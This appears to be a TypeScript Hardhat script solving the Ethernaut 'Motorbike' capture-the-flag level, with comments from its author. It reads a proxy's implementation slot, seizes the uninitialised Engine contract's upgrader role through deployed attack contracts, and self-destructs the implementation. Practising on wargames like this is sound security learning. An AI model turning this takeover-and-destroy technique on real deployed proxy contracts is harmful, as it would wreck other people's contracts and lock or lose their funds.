// Runtime Environment's members available in the global scope.
import { ethers } from 'ethers';
import { BigNumber, Signer, BytesLike } from "ethers";
import { getSigner } from "./signer";
import { AttackMotorBike__factory, Engine__factory, MotorbikeAttack__factory } from "../typechain";
import { createLevel, submitLevel } from './utils';
import hre from "hardhat";
async function main() {
  // Ok so the ethernaut webversion contract give wrong address. The address it give is the proxy contract. Not the wallet contract.
  // the proxy keep delegate view call to the wallet contract. 
  const signer = getSigner();
  const level = await createLevel(signer, "Motorbike");
  const player = await signer.getAddress();
  const _IMPLEMENTATION_SLOT =
    "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
  

  await MyAnswer();
  // await OriginalAnswer();

  async function OriginalAnswer(){
    const engineAddress = "0x" + (await signer.provider?.getStorageAt(level, _IMPLEMENTATION_SLOT))?.substring("0x000000000000000000000000".length);
    console.log("engine address:", engineAddress);
    const attacker = await (new MotorbikeAttack__factory(signer)).deploy(engineAddress);
    console.log("attacker address:", attacker.address);
    // ATTACK FIRST STEP: Take control over upgradeability functionality
    await attacker.takeControl({gasLimit: 1000000});

    // ATTACK SECOND STEP: Destroy the implementation
    await attacker.destroy({gasLimit: 1000000});
  }

  async function MyAnswer() {
    console.log(await signer.provider?.getStorageAt(level, 0));
    console.log(await signer.provider?.getStorageAt(level, 1));
    console.log(await signer.provider?.getStorageAt(level, 2));
    console.log(await signer.provider?.getStorageAt(level, 3));
    console.log("implement:", await signer.provider?.getStorageAt(level, _IMPLEMENTATION_SLOT));

    // The proxy store all storage. 
    // But power to change implementation belong to the logic side.
    // Our goals is to selfdestruct the engine.
    const engineAddress = "0x" + (await signer.provider?.getStorageAt(level, _IMPLEMENTATION_SLOT))?.substring("0x000000000000000000000000".length);
    console.log("engine address:", engineAddress);
    const engine = (new Engine__factory(signer)).attach(engineAddress);
    // The engine have not called init. We can take over easily.
    // But we want the master to be another contract that can call destruct.
    // So when switch to new implementation, the new contract master will destruct when engine use delegatecall() to init.
    console.log("deploying new attack");
    const attack = await (new AttackMotorBike__factory(signer)).deploy();
    // const attack = await (new AttackMotorBike__factory(signer)).attach("0xA7A05F359FEe4177e3F378fB5019f8B7DE3ff05C");
    await attack.deployed();
    console.log("attack address:", attack.address);
    console.log("take over now");

    await (await attack.TakeOver(engineAddress, { gasLimit: 1000000 })).wait();
    console.log("owner:", await engine.upgrader());
    console.log("upgrade and die");
    await (await attack.UpgradeAndCallDestroy(engineAddress, { gasLimit: 1000000 })).wait();
  }
  await submitLevel(signer, level);
}

main()
  .then(() => {
    console.log("Done!");
    process.exit(0);
  })
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });